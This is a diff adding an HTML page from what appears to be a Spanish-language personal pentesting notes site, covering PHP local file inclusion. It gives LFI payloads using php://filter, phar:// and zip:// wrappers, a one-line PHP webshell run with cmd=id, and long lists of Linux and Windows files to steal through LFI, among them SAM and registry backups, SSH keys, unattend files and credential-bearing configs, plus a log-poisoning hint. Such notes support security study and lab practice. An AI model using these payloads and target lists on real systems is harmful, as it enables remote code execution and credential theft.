@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;a href=&quot;https://deephacking.tech/php-wrappers-pentesting-web/&quot;&gt;PHP Wrappers - Deep Hacking&lt;/a&gt;&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><a href="https://deephacking.tech/php-wrappers-pentesting-web/">PHP Wrappers - Deep Hacking</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=php://filter/convert.base64-encode/resource=index
+</code></pre></div></div>
+
+<p>https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>[Exploiting phar stream wrapper. There are a few protocols available…</td>
+      <td>by Rudra Sarkar</td>
+      <td>Medium](https://rudrasarkar.medium.com/exploiting-phar-stream-wrapper-d2140592c6e7)</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET /index.php?file=phar://uploads/upload_1757759303.zip/shell&amp;cmd=id 
+</span></code></pre></div></div>
+
+<p>Abriendo un zip:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// upload a php shell then use zip wrapper for reverse shell  
+$ cat simple_cmd.php  
+&lt;?php system($_REQUEST["cmd"]); ?&gt;  
+  
+  
+// browse to the uploaded php webshell using Zip Wrapper LFI  
+http://192.168.226.229/index.php?file=zip://uploads/upload_1714872711.zip%23simple_cmd&amp;cmd=id
+</code></pre></div></div>
+
+<h1 id="interesting-files-4-lfi">Interesting Files 4 LFI</h1>
+<h1 id="linux">Linux</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.ssh/authorized_keys
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/nginx/nginx.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/nginx/sites-available
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/nginx/sites-enable
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/mysql/my.cnf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/httpd/httpd.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/oracle2/oracle2.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/proc/net/arp
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/proc
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>puertos abiertos
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/my.cnf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/os-release
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/sites-enabled/000-default.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/mysql -&gt; moodle-key.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/apache2/access.log
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/auth.log
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/log/httpd-access.log
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/conf-available/security.conf
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/apache2/sites-enabled/vhost.conf
+</code></pre></div></div>
+
+<p>Ver lo que hace el DockerFile del repo para ver que archivos de configuración mueve</p>
+
+<h1 id="windows">Windows</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+c:/boot.ini
+C:/boot.ini
+C:/Documents and Settings/Administrator/NTUser.dat
+c:/inetpub/logs/logfiles
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+c:/inetpub/wwwroot/global.asa
+C:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php/php.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+C:/Users/Administrator/NTUser.dat
+C:/Windows/debug/NetSetup.log 
+C:/Windows/Panther/Unattend/Unattended.xml 
+C:/Windows/Panther/Unattended.xml 
+C:/WINDOWS/php.ini
+C:/windows/repair/sam
+C:/Windows/repair/security
+C:/Windows/repair/software  
+c:/windows/repair/system
+C:/Windows/repair/system
+C:/Windows/system32/config/AppEvent.Evt 
+C:/Windows/system32/config/default.sav 
+C:/Windows/system32/config/regback/default 
+C:/Windows/system32/config/regback/sam 
+C:/Windows/system32/config/regback/security 
+C:/Windows/system32/config/regback/software
+C:/Windows/system32/config/regback/system 
+C:/Windows/system32/config/SecEvent.Evt 
+C:/Windows/system32/config/security.sav 
+C:/Windows/system32/config/software.sav 
+C:/Windows/system32/config/system.sav 
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/System32/inetsrv/config/applicationHost.config 
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
+C:/Windows/win.ini 
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log 
+C:/xampp/apache/logs/error.log 
+C:\xampp\htdocs\config.php
+</code></pre></div></div>
+
+<p><strong>httpd.conf para ver si se puede hacer log poisoning</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/xampp/apache/conf/httpd.conf
+C:/wamp64/bin/apache/apache2.4.54/conf/httpd.conf
+C:/wamp64/bin/apache/apache2.4.53/conf/httpd.conf
+C:/wamp64/bin/apache/apache2.4.52/conf/httpd.conf
+C:/wamp64/bin/apache/apache2.4.51/conf/httpd.conf
+C:/wamp64/bin/apache/apache2.4.50/conf/httpd.conf
+C:/laragon/bin/apache/httpd-2.4.54/conf/httpd.conf
+C:/laragon/bin/apache/httpd-2.4.53/conf/httpd.conf
+C:/laragon/bin/apache/httpd-2.4.52/conf/httpd.conf
+C:/laragon/bin/apache/httpd-2.4.51/conf/httpd.conf
+C:/laragon/bin/apache/httpd-2.4.50/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+C:/Apache24/conf/httpd.conf
+</code></pre></div></div>
+
+<p>SI no se ha configurado algo así, entonces no irá:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AddType application/x-httpd-php .log
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
